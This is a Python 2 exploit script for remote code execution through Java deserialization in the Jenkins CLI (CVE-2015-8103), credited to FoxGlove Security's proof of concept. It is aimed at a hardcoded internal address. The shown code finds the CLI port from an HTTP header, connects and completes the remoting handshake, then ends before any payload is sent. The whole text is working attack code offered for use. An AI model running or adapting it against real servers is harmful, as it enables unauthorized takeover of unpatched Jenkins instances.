#! /usr/bin/env python2

#Jenkins CLI RMI Java Deserialization RCE (CVE-2015-8103)
#Based on the PoC by FoxGlove Security (https://github.com/foxglovesec/JavaUnserializeExploits)
#Made with <3 by @byt3bl33d3r

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

import socket
import sys
import base64
import argparse
import os
from subprocess import check_output

host = "192.168.1.109"
port = 8080

print '[*] Retrieving the Jenkins CLI port'
#Query Jenkins over HTTP to find what port the CLI listener is on
r = requests.get(url="http://192.168.1.109:8080")
cli_port = int(r.headers['X-Jenkins-CLI-Port'])

#Open a socket to the CLI port
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = (host, cli_port)
print '[*] Connecting to Jenkins CLI on {}:{}'.format(host, cli_port)
sock.connect(server_address)

# Send headers
headers='\x00\x14\x50\x72\x6f\x74\x6f\x63\x6f\x6c\x3a\x43\x4c\x49\x2d\x63\x6f\x6e\x6e\x65\x63\x74'
print '[*] Sending headers'
sock.send(headers)

data = sock.recv(1024)
print '[*] Received "{}"'.format(data)

if data.find('JENKINS REMOTING CAPACITY') == -1:
    data = sock.recv(1024)
    print '[*] Received "{}"'.format(data)



